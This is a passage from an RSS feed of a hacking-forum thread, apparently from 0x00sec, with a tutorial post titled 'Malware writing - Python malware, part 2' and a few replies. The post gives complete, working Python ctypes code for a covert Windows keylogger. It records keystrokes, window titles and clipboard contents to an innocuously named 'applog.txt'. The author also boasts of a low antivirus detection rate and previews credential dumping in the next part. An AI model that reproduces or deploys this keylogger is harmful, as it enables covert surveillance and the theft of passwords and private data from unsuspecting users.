        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/5</link>
        <pubDate>Thu, 28 Feb 2019 21:08:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-5</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[Djimbu]]></dc:creator>
        <description><![CDATA[
            <p>Trying to get this working on my windows 10 box.<br>
Error line 206 in hook_procedure<br>
return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, c_ulonglong(1Param))<br>
ValueError: Procedure probably called with too many arguments (4 bytes in excess)</p>
<p>What do you think this could be?  I’m stumped</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/4</link>
        <pubDate>Thu, 28 Feb 2019 19:39:01 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-4</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Sure man, feel free to message me anytime. I’m on the IRC server and Discord too, same username. Something higher level would have been better as I wanted this to be more of an intro but I felt I didn’t had much choice this time lol</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/3</link>
        <pubDate>Thu, 28 Feb 2019 13:25:26 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-3</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[BrokenAdministrator]]></dc:creator>
        <description><![CDATA[
            <p>The a pip module <code>keyboard</code> can be buggy, but I spent some time working with it and developed a keylogger with it, I found that it was not that bad of a library. Although the API documentation was not the best, albeit. I was planning on posting about it recently. Care to discuss ideas via PM?</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/2</link>
        <pubDate>Thu, 28 Feb 2019 13:08:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-2</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <h1>Malware writing series - Python Malware, part 2</h1>
<p>Following <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a>’s comment regarding  <code>GetAsyncKeyState</code> being responsible for the crazy CPU usage in part 1, I decided to follow his recommendation and use <code>SetWindowHookExA</code>. Initially, this was supposed to be a simple introduction to ctypes. I wasn’t planning to write a second version of the keylogger with ctypes, but I changed my mind. Using <code>SetWindowHookExA</code> is much better and brought the CPU usage down two zero. But also, after searching for a keylogger fully written with ctypes, I couldn’t find anything decent. Might as well make one.</p>
<p>Unfortunately it is much more complicated too. I tried multiple packages such as <code>keyboard</code> and <code>pynput</code> but both were very buggy and unreliable. Pynput couldn’t print special characters such as +, -, %, ^, etc. Keyboard has a bug were, then typing too fast, letters are missing. The package also have over 100 unresolved issues. The only maintainer appears to have abandoned the project. PyHook is just not an option. There are unofficial packages but Python 3 but they don’t contain bug fixes. The package is simply not reliable enough to use and will make the keylogger crash.</p>
<p>Therefore, I had no choice but to write everything from scratch.</p>
<p>So in this part, we’ll rewrite the keylogger to use <code>SetWindowsHookEx</code>. It’s going to be a lot more complicated but will give us a deeper understanding on how to use ctypes to interact with the WinAPI.</p>
<p>Let’s start.</p>
<h2>Writing a keylogger in Python from scratch with ctypes</h2>
<p>What is a hook? From MSDN: <em>“A hook is a point in the system message-handling mechanism where an application can install a subroutine to monitor the message traffic in the system and process certain types of messages before they reach the target window procedure.”</em></p>
<p>In simple terms, you hit a key, the hook intercepts the keyboard event.</p>
<p>We start by importing the required packages, load <code>user32.dll</code> and <code>kernel32.dll</code>, set up logging and create the variables to hold the text, the windows titles and keys pressed.</p>
<pre><code class="lang-auto">from ctypes import *
from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
import logging
import os

logging.basicConfig(filename=(os.environ['localappdata'] +"\\" + 'applog.txt'), level=logging.DEBUG, format='%(message)s')

# Load the required librairies
user32 = windll.user32
kernel32 = windll.kernel32


current_window = None   # Holds the current window title
current_clipboard = []  # Holds the current clipboard content
last_key = None         # Holds the last key pressed
line = ""               # Holds the lines of keyboard characters pressed
</code></pre>
<p>The hooking function we’re going to use are <code>SetWindowsHookExA</code>, <code>UnhookWindowsHookEx</code> and <code>CallNextHookEx</code>. We also need a class to use as data structure to hold the data from keyboard input events received from the <code>KBDLLHOOKSTRUCT</code> struct.</p>
<p>First, we must declare some constants that will be required later when calling WinAPI functions.</p>
<pre><code class="lang-auto">WH_KEYBOARD_LL = 13     # Hook ID to pass to SetWindowsExA
WM_KEYDOWN = 0x0100     # VM_KEYDOWN message code
HC_ACTION = 0           # Parameter for KeyboardProc callback function
</code></pre>
<p><code>SetWindowsHookExA</code> needs to know what type of hook it has to set. We need to pass the hook ID as first argument. In this case, we use <code>WH_KEYBOARD_LL</code> because, unlike <code>WH_KEYBOARD</code>, it does not require to inject a DLL in the processes and therefore is hard to catch.</p>
<p><code>WM_KEYDOWN</code> tells us when a non-system key is pressed.</p>
<p><code>HC_ACTION</code> is an argument to pass to the <code>KeyboardProc</code> callback functions.</p>
<p>After, we have to map the virtual keys to their respective hex values and create the <code>HOOKPROC</code> callback function. Then we create a pointer that points to the callback function. This pointer is later passed as argument to <code>SetWindowsHookExA</code>.</p>
<pre><code class="lang-auto"># VIRTUAL KEYS CODES: Needed to handle special keys such as CTRL or RETURN
# Reference: http://nehe.gamedev.net/article/msdn_virtualkey_codes/15009/
VIRTUAL_KEYS = {'RETURN': 0x0D,
                'CONTROL': 0x11,
                'SHIFT': 0x10,
                'MENU': 0x12,
                'TAB': 0x09,
                'BACKSPACE': 0x08,
                'CLEAR': 0x0C,
                'CAPSLOCK': 0x14,
                'ESCAPE': 0x1B,
                'HOME': 0x24,
                'INS': 0x2D,
                'DEL': 0x2E,
                'END': 0x23,
                'PRINTSCREEN': 0x2C,
                'CANCEL': 0x03
                }

HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM) # Callback function
</code></pre>
<p>The virtual keys are needed to detect special keys pressed such as ENTER, SHIFT, etc. I did not include all of them, because the list is extensive but you can add more if you wish to log more. Just visit the reference in the code, above the variable name, to get all the hex values.</p>
<p>We use the <code>WINFUNCTYPE</code> factory ctypes function to create the <code>HOOKPROC</code> callback function.</p>
<p>Then, we need a data structure to hold information about the keyboard input events. We just need to replicate the structure provided by MSDN here: <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagkbdllhookstruct" rel="noopener nofollow ugc">https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagkbdllhookstruct</a></p>
<pre><code class="lang-auto">class KBDLLHOOKSTRUCT(Structure): _fields_=[ 
    ('vkCode',DWORD),
    ('scanCode',DWORD),
    ('flags',DWORD),
    ('time',DWORD),
    ('dwExtraInfo',DWORD)]
</code></pre>
<p>Now we have everything we need to start! This time, we will make a class named <code>hook</code> that will monitor the keyboard events by installing a hook.</p>
<pre><code class="lang-auto">class hook:
    """
    Class for installing/uninstalling a hook
    """

    def __init__(self):
        """
        Constructor for the hook class.

        Responsible for allowing methods to call functions from
        user32.dll and kernel32.dll.
        """
        self.user32 = user32
        self.kernel32 = kernel32
        self.is_hooked = None


    def install_hook(self, ptr):
        """
        Method for installing hook.

        Arguments
            ptr: pointer to the HOOKPROC callback function
        """
        self.is_hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ptr,
            kernel32.GetModuleHandleW(None),
            0
        )

        if not self.is_hooked:
            return False
        return True

    def uninstall_hook(self):
        """
        Method for uninstalling the hook.
        """

        if self.is_hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.is_hooked)
        self.is_hooked = None

</code></pre>
<p>We need to start with the constructor that will allow methods to call <code>user32.dll</code> and <code>kernel32.dll</code> functions. We also need to declare the variable <code>is_hooked</code> that will hold the handle to the hook procedure returned by <code>SetWindowsHookExA</code>.</p>
<p>We then proceed with creating the method <code>install_hook</code> that, as the name says, will install the hook calling <code>SetWindowsHookExA</code>, passing the hook ID (type of hook) and the pointer to the callback function as argument. The returned value is the handle to the hook procedure that we store in <code>is_hooked</code>.</p>
<p>Finally, we create the function <code>uninstall_hook</code> (optional) to uninstall the hook. Useful when testing the keylogger.</p>
<p>Then, we take our previously written <code>get_current_window()</code> and <code>get_clipboard()</code> functions from Part 1.</p>
<pre><code class="lang-auto">def get_current_window(): # Function to grab the current window and its title

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow() # Get handle to foreground window
    length = GetWindowTextLength(hwnd) # Get length of the window text in title bar
    buff = create_unicode_buffer(length + 1) # Create buffer to store the window title string
    
    GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff

    return buff.value # Return the value of buff

def get_clipboard():
    
    CF_TEXT = 1 # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [c_void_p]
    kernel32.GlobalLock.restype = c_void_p
    kernel32.GlobalUnlock.argtypes = [c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = c_void_p
    user32.OpenClipboard(0)
    
    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT) # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get ptr to memory location where the data is located
            text = c_char_p(data_locked) # Get a char * ptr (string in Python) to the location of data_locked
            value = text.value # Dump the content in value
            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
            return value.decode('latin1') # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard
</code></pre>
<p>Now it’s time to write the hook procedure that this called every time a keyboard event occurs.</p>
<pre><code class="lang-auto">def hook_procedure(nCode, wParam, lParam):

    # Need to be global so they're not emptied at every key pressed
    global last_key
    global current_clipboard
    global line
    global current_window
</code></pre>
<p>We have to specify to the function that the variables we previously created are global and that they can be accessed by this function. The reason why we can’t use local variables is that, whenever a key is pressed, the <code>hook_procedure</code> function is executed and therefore, the local variables will be cleared at every key pressed. That’s not very useful if we want to use them to compared the last key, last window or last clipboard data.</p>
<p>Then, like in Part 1, we need to know what is the current window opened when the user is typing so we have some context and know how to use the data we retrieve.</p>
<pre><code class="lang-auto">    if current_window != get_current_window():
        current_window = get_current_window()
        logging.info('[WINDOW] ' + current_window)
    
    
    # Remove comments below if you want to the possibility to uninstall the hook when testing.
    """
    if user32.GetKeyState(VIRTUAL_KEYS['CONTROL']) &amp; 0x8000:
        hook.uninstall_hook()
        return 0
    """
</code></pre>
<p>Optionally, we can use a function to uninstall the hook whenever a specific key is pressed (CONTROL here). Now we can start writing the keylogging routine triggered at every key pressed.</p>
<pre><code class="lang-auto">    if nCode == HC_ACTION and wParam == WM_KEYDOWN:

        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        user32.GetKeyState(VIRTUAL_KEYS['SHIFT'])
        user32.GetKeyState(VIRTUAL_KEYS['MENU'])
        state = (c_char * 256)()
        user32.GetKeyboardState(byref(state))
        buff = create_unicode_buffer(8)
        n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)
        key = wstring_at(buff)     # Key pressed as buffer
</code></pre>
<p>The logic here is that, when a key is pressed, we use <code>from_address</code> to take the information about the keyboard event and store it in the <code>kb</code> variable as a data structure, using the previously created <code>KBDLLHOOKSTRUCT</code> class. The we create a <code>state</code> variable of size 256 to hold the state of all 256 virtual keys. This is done by calling the <code>GetKeyboardState()</code> function.</p>
<p>Then, we declare a <code>buff</code> variable to create a unicode character buffer (an array of values with the <code>wchar</code> datatype). We then use <code>ToUnicode</code> function from <code>user32.dll</code> to translate the virtual key code or keyboard state to a unicode character, and the <code>wstring_at()</code> function to store the characters as 1-character unicode string.</p>
<p>ToUnicode can return one of four values: 1, a dead key, 0, for which there is no translation, - 1, a character and - 2 ≤ value, two or more characters.</p>
<p>The returned value is being stored in <code>n</code>. So every time a key is pressed, the hook procedure stores the return value and we can use this to determine whether or not we want to log the character or not. As long as <code>n</code> is larger than 0, we want to log the key pressed.</p>
<pre><code class="lang-auto">        if n &gt; 0:

            # Avoid logging weird characters. If they show up,
            # get the hex code here http://asciivalue.com/index.php
            # and add to VIRTUAL_KEYS
            if kb.vkCode not in VIRTUAL_KEYS.values():
                line += key

            for key, value in VIRTUAL_KEYS.items(): 
                if kb.vkCode == value:
                    logging.info(key)

            if kb.vkCode == VIRTUAL_KEYS['RETURN']:
                logging.info(line)
                line = ""

            if current_clipboard != get_clipboard():
                current_clipboard = get_clipboard()
                logging.info('[CLIPBOARD] ' + current_clipboard + '\n')

    return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, c_ulonglong(lParam))
</code></pre>
<p>The rest is pretty simple. We start by logging any key. The key is appended to the <code>line</code> variable to create a full, easily readable line.</p>
<p>Then, if <code>RETURN</code> is pressed, we log the line and clear the <code>line</code> variable.</p>
<p>Finally, we check the current status of the clipboard. If there is new data in the clipboard, we log that data. Then we pass the hook information to the next hook procedure with <code>CallNextHookEx</code>. And it continues again and again.</p>
<p>That’s about it! All we have to do is:<br>
- Create an instance of the <code>hook()</code> class<br>
- Create the pointer with <code>ptr</code><br>
- Install the hook with <code>install_hook(ptr)</code><br>
- Wait for system messages to be intercepted by the hook</p>
<pre><code class="lang-auto">hook = hook()                           # Hook class
ptr = HOOKPROC(hook_procedure)          # Pointer to the callback function
hook.install_hook(ptr)                  # Installing hook
msg = MSG()
user32.GetMessageA(byref(msg), 0, 0, 0)
</code></pre>
<p>Look at that CPU usage!<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/b/ba1c9a660ab3661d767a4519f2377d58dcc79499.png" alt="image" data-base62-sha1="qyq5FmfyFH3ui7bvhLxdFojtSIh" width="690" height="36"></p>
<p>Look at that detection rate!<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4d840c45f70353185f8cfce6ff5daa689b68f742.png" alt="image" data-base62-sha1="b3JFWZupPjyRSbyldLzEaX6MJ2i" width="690" height="241"><br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/d/9/d94764657d0d75c8dc3b4c65d15a3a10d3418817.png" class="site-icon" width="100" height="89">
      <a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener nofollow ugc">virustotal.com</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener nofollow ugc">VirusTotal</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>I don’t know who the fuck uses Jiangmin anyway.</p>
<p>There’s one issue I am working on at the moment and I’ll update the code and the post when I find a solution. PyInstaller seems to have poor support for either ctypes or the logging library. Therefore, it creates the file on disk at execution but isn’t writing in it. I’m currently looking and testing alternatives and will update accordingly.</p>
<p>There are other ways to build a standalone executable but we will cover these later. PyInstaller is my favorite because I use it for many other things, therefore I really want to find a solution!</p>
<p>In part 3, we will look at how to dump credentials with standard user privileges. This time it’s going to be a lot simpler. We will use PyWin32 so it’s unlikely that we’ll have to write any WinAPI calls from scratch. I don’t even think we’ll need ctypes period.</p>
<p>You’ll find the complete keylogger code below and here: <a href="https://github.com/tr4cefl0w/0x00sec/tree/master/python-malware" rel="noopener nofollow ugc">https://github.com/tr4cefl0w/0x00sec/tree/master/python-malware</a></p>
<p>Thanks to <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a> for the tip and to that guy on HackerThreads showing how create a hook with Python (kind of).</p>
<pre><code class="lang-auto"># KEYLOGGER WITH CTYPES AND SETWINDOWSHOOKEX FROM MY 0X00SEC POST.
# THIS IS A PROOF-OF-CONCEPT AND I AM NOT RESPONSIBLE FOR ANY 
# USAGE OF THIS CODE OR MALICIOUS PURPOSE.

from ctypes import *
from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
import logging
import os

logging.basicConfig(filename=(os.environ['localappdata'] +"\\" + 'applog.txt'), 
                    level=logging.DEBUG, format='%(message)s')

# Load the required librairies
user32 = windll.user32
kernel32 = windll.kernel32


current_window = None   # Holds the current window title
current_clipboard = []  # Holds the current clipboard content
last_key = None         # Holds the last key pressed
line = ""               # Holds the lines of keyboard characters pressed


WH_KEYBOARD_LL = 13     # Hook ID to pass to SetWindowsExA
WM_KEYDOWN = 0x0100     # VM_KEYDOWN message code
HC_ACTION = 0           # Parameter for KeyboardProc callback function

# VIRTUAL KEYS CODES: Needed to handle special keys such as CTRL or RETURN
# Reference: http://nehe.gamedev.net/article/msdn_virtualkey_codes/15009/
VIRTUAL_KEYS = {'RETURN': 0x0D,
                'CONTROL': 0x11,
                'SHIFT': 0x10,
                'MENU': 0x12,
                'TAB': 0x09,
                'BACKSPACE': 0x08,
                'CLEAR': 0x0C,
                'CAPSLOCK': 0x14,
                'ESCAPE': 0x1B,
                'HOME': 0x24,
                'INS': 0x2D,
                'DEL': 0x2E,
                'END': 0x23,
                'PRINTSCREEN': 0x2C,
                'CANCEL': 0x03,
                'BACK': 0x08,
                'LBUTTON': 0x01
                }

HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM) # Callback function

class KBDLLHOOKSTRUCT(Structure): _fields_=[ 
    ('vkCode',DWORD),
    ('scanCode',DWORD),
    ('flags',DWORD),
    ('time',DWORD),
    ('dwExtraInfo',DWORD)]

class hook:
    """
    Class for installing/uninstalling a hook
    """

    def __init__(self):
        """
        Constructor for the hook class.

        Responsible for allowing methods to call functions from
        user32.dll and kernel32.dll.
        """
        self.user32 = user32
        self.kernel32 = kernel32
        self.is_hooked = None


    def install_hook(self, ptr):
        """
        Method for installing hook.

        Arguments
            ptr: pointer to the HOOKPROC callback function
        """
        self.is_hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ptr,
            kernel32.GetModuleHandleW(None),
            0
        )

        if not self.is_hooked:
            return False
        return True

    def uninstall_hook(self):
        """
        Method for uninstalling the hook.
        """

        if self.is_hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.is_hooked)
        self.is_hooked = None


def get_current_window(): # Function to grab the current window and its title

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow() # Get handle to foreground window
    length = GetWindowTextLength(hwnd) # Get length of the window text in title bar
    buff = create_unicode_buffer(length + 1) # Create buffer to store the window title buff
    
    GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff

    return buff.value # Return the value of buff

def get_clipboard():
    
    CF_TEXT = 1 # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [c_void_p]
    kernel32.GlobalLock.restype = c_void_p
    kernel32.GlobalUnlock.argtypes = [c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = c_void_p
    user32.OpenClipboard(0)
    
    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT) # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get ptr to memory location where the data is located
            text = c_char_p(data_locked) # Get a char * ptr (buff in Python) to the location of data_locked
            value = text.value # Dump the content in value
            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
            return value.decode('latin1') # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard

def hook_procedure(nCode, wParam, lParam):
    """
    Hook procedure to monitor and log keyboard events.

    Arguments:
        nCode       = HC_ACTION code
        wParam      = Keyboard event message code
        lParam      = Address of keyboard input event

    """

    # Need to be global so they're not emptied at every key pressed
    global last_key
    global current_clipboard
    global line
    global current_window

    if current_window != get_current_window():
        current_window = get_current_window()
        logging.info('[WINDOW] ' + current_window)
    
    
    # Remove comments below if you want to the possibility to uninstall the hook when testing.
    """
    if user32.GetKeyState(VIRTUAL_KEYS['CONTROL']) &amp; 0x8000:
        hook.uninstall_hook()
        return 0
    """

    if nCode == HC_ACTION and wParam == WM_KEYDOWN:

        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        user32.GetKeyState(VIRTUAL_KEYS['SHIFT'])
        user32.GetKeyState(VIRTUAL_KEYS['MENU'])
        state = (c_char * 256)()
        user32.GetKeyboardState(byref(state))
        buff = create_unicode_buffer(8)
        n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)
        key = wstring_at(buff)     # Key pressed as buffer
        if n &gt; 0:

            # Avoid logging weird characters. If they show up,
            # get the hex code here http://asciivalue.com/index.php
            # and add to VIRTUAL_KEYS
            if kb.vkCode not in VIRTUAL_KEYS.values():
                line += key

            for key, value in VIRTUAL_KEYS.items(): 
                if kb.vkCode == value:
                    logging.info(key)

            if kb.vkCode == VIRTUAL_KEYS['RETURN']:
                logging.info(line)
                line = ""

            if current_clipboard != get_clipboard():
                current_clipboard = get_clipboard()
                logging.info('[CLIPBOARD] ' + current_clipboard + '\n')

    return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, c_ulonglong(lParam))

hook = hook()                           # Hook class
ptr = HOOKPROC(hook_procedure)          # Pointer to the callback function
hook.install_hook(ptr)                  # Installing hook
msg = MSG()                             # MSG data structure
user32.GetMessageA(byref(msg), 0, 0, 0) # Wait for messages to be posted

</code></pre>
<p><strong>EDIT 1:</strong> Added support for special characters and removed a sentence related to that issue.<br>
<strong>EDIT 2:</strong> Fixed some typos<br>
<strong>EDIT 3:</strong> Changed the link to the Github repo as the structure changed.<br>
<strong>EDIT 4:</strong> Fixed typo in code snippet.<br>
References:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="http://www.hackerthreads.org/Topic-42395" target="_blank" rel="noopener nofollow ugc">hackerthreads.org</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="http://www.hackerthreads.org/Topic-42395" target="_blank" rel="noopener nofollow ugc">[python] KeyboardHook class - hackerthreads.org</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png" class="thumbnail" width="" height="">

<h3><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex" target="_blank" rel="noopener nofollow ugc">CallNextHookEx function (winuser.h) - Win32 apps</a></h3>

<p>Passes the hook information to the next hook procedure in the current hook chain. A hook procedure can call this function either before or after processing the hook information.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-tounicode" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png" class="thumbnail" width="" height="">

<h3><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-tounicode" target="_blank" rel="noopener nofollow ugc">ToUnicode function (winuser.h) - Win32 apps</a></h3>

<p>Translates the specified virtual-key code and keyboard state to the corresponding Unicode character or characters.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-keydown" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png" class="thumbnail" width="" height="">

<h3><a href="https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-keydown" target="_blank" rel="noopener nofollow ugc">WM_KEYDOWN message (Winuser.h) - Win32 apps</a></h3>

<p>Posted to the window with the keyboard focus when a nonsystem key is pressed. A nonsystem key is a key that is pressed when the ALT key is not pressed.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png" class="thumbnail" width="" height="">

<h3><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa" target="_blank" rel="noopener nofollow ugc">SetWindowsHookExA function (winuser.h) - Win32 apps</a></h3>

<p>Installs an application-defined hook procedure into a hook chain.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagmsg" class="onebox" target="_blank" rel="noopener nofollow ugc">https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagmsg</a><br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="http://www.winprog.org/tutorial/message_loop.html" target="_blank" rel="noopener nofollow ugc">winprog.org</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="http://www.winprog.org/tutorial/message_loop.html" target="_blank" rel="noopener nofollow ugc">Tutorial: Understanding the Message Loop</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858/1</link>
        <pubDate>Mon, 25 Feb 2019 03:02:19 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11858-1</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858.rss">Malware writing - Python malware, part 2: Keylogging with ctypes and SetWindowsHookExA</source>
      </item>
  </channel>
</rss>
